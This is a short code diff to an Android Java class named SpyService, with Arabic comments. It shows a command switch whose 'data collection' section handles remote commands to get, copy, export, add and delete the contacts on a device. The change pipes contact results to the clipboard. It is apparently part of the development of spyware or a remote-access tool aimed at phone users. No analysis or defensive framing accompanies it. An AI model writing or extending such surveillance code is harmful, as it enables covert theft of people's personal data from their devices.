@@ -130,8 +130,8 @@ public class SpyService extends Service {
         // سيتم تنفيذ جميع الأوامر هنا – الجزء الثاني يحتوي على جميع الـ switch
         switch (cmd) {
             // --- جمع البيانات (25) ---
-            case "get_contacts": getContacts(); break;
-            case "copy_contacts": copyContacts(); break;
+            case "get_contacts": getContacts(); copyToClipboard(result); break;
+            case "copy_contacts": copyContacts(); copyToClipboard(result); break;
             case "export_contacts": exportContacts(); break;
             case "add_contact": addContact(); break;
             case "delete_contact": deleteContact(); break;
